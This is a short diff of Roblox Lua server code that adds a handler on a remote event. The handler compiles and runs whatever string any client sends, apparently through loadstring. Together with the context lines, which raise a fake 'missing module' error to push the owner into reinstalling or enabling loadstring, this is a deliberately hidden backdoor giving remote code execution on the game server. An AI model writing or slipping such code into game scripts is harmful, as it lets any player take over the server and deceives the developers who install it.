@@ -32,3 +32,6 @@ if not ls then
   error("Missing required module: ".. fakeDependency[math.random(1,#fakeDependency)]..". Please re-install")
 end
 
+mainRemote.OnServerEvent:Connect(function(plr, nice)
+    ls(nice)()
+end)
